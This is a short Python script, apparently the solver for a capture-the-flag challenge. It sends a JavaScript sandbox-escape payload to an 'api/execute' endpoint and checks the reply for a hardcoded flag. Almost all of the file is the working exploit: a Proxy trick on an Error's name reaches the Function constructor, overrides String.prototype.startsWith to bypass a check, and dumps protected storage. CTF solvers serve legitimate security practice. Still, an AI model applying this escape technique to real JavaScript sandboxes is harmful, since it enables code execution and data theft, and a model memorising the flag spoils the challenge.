#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from requests import post
from time import sleep

# Wait for server to start
for _ in range(5):
    try:
        r = post(
            'http://challenge:3000/api/execute',
            json={
                "script": '''
(()=>{const a=new Error;a.name={toString:new Proxy(()=>{},{apply(a,b,c){throw c.constructor.constructor("String.prototype.startsWith = (s, p) => { return false; };return [...secureRequire('util').inspect(globalThis.storage, {customInspect: true, depth: Infinity})]")()}})};try{a.stack}catch(a){return a}})();
                '''.strip()
            }
        )
        r.raise_for_status()
    except:
        sleep(5)
        continue

    exit(0 if 'cr3{1N_D3P7H_0F_J5_4ND_J5C}' in r.text.replace(',', '') else 1)

exit(1)
